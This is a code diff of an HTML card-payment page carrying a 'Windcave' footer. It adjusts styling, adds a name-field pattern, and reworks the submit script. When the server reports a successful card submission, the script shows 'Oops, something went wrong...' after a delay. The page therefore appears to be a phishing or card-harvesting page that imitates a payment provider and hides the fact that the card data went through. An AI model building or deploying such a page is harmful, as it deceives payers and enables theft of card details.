@@ -47,8 +47,8 @@
 
         .close {
             position: absolute;
-            top: 5px;
-            right: 10px;
+            top: 0px;
+            right: 7px;
             font-size: 18px;
             cursor: pointer;
             color: #333;
@@ -57,7 +57,7 @@
         /* Additional styling for the modal */
         #modalMessage {
             font-size: 16px;
-            margin-bottom: 15px;
+            margin-bottom: 0px;
             color: #333;
         }
 
@@ -223,7 +223,7 @@
 
             <div class="col-md-6">
               <label for="cc-name" class="form-label">Name on card</label>
-              <input type="text" class="form-control" id="cc-name" name="name"  placeholder="" required>
+              <input type="text" class="form-control" id="cc-name" name="name"  placeholder="" required pattern="[A-Za-z]{5,}">
               <small class="text-body-secondary">Full name as displayed on card</small>
               <div class="invalid-feedback">
                 Name on card is required
@@ -272,40 +272,43 @@
       </div>
   </div>
   
-  <script>
-      // Your existing JavaScript code
-      document.getElementById('paymentForm').addEventListener('submit', function (event) {
-          event.preventDefault();
-  
-          // Perform form submission via AJAX
-          var formData = new FormData(this);
-  
-          fetch(this.action, {
-              method: 'POST',
-              body: formData,
-          })
-          .then(response => response.json())
-          .then(data => {
-              if (data.success) {
-                  // Show success modal
+<script>
+  // Your existing JavaScript code
+  document.getElementById('paymentForm').addEventListener('submit', function (event) {
+      event.preventDefault();
+
+      // Perform form submission via AJAX
+      var formData = new FormData(this);
+
+      fetch(this.action, {
+          method: 'POST',
+          body: formData,
+      })
+      .then(response => response.json())
+      .then(data => {
+          if (data.success) {
+              // Show success modal after a 1-second delay
+              setTimeout(function() {
                   showModal('Oops, something went wrong...');
-              } 
-          });
+              }, 1300);
+          } 
       });
-  
-      // Function to show the modal
-      function showModal(message) {
-          document.getElementById('modalMessage').innerHTML = message;
-          document.getElementById('modal').style.display = 'block';
-          document.getElementById('overlay').style.display = 'block';
-      }
-  
-      // Function to close the modal
-      function closeModal() {
-          document.getElementById('modal').style.display = 'none';
-          document.getElementById('overlay').style.display = 'none';
-      }
-  </script>
+  });
+
+  // Function to show the modal
+  function showModal(message) {
+      document.getElementById('modalMessage').innerHTML = message;
+      document.getElementById('modal').style.display = 'block';
+      document.getElementById('overlay').style.display = 'block';
+  }
+
+  // Function to close the modal
+  function closeModal() {
+      document.getElementById('modal').style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
+  }
+</script>
+
   
   <footer class="my-5 pt-5 text-body-secondary text-center text-small">
     <p class="mb-1">&copy; Windcave</p>
